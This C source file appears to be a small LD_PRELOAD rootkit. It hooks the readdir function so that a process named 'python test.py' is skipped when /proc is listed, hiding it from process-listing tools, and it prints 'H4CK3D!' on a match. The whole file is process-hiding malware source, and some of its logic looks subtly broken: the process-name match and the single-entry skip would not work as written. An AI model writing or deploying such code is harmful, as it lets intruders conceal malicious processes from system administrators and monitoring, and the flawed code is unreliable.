#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

#define HIDEPID "143559"

static struct dirent* (*orig_readdir)(DIR *dirp) = NULL;

static const char* process_to_filter = "python test.py";

static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

struct dirent *readdir(DIR *dirp)
{
    struct dirent *entry;

    if (orig_readdir == NULL)
    {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    entry = orig_readdir(dirp);
    if (entry != NULL)
    {
        // if (strcmp(entry->d_name, HIDEPID) == 0)
        // {
        //     printf("H4CK3D!\n");
        //     entry = orig_readdir(dirp);
        // }
        char dir_name[256];
        char process_name[256];
        if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&
            strcmp(dir_name, "/proc") == 0 &&
            get_process_name(entry->d_name, process_name) &&
            strcmp(process_name, process_to_filter) == 0) {
            // continue;
            printf("H4CK3D!\n");
            entry = orig_readdir(dirp);
        }
    }
    return entry;
}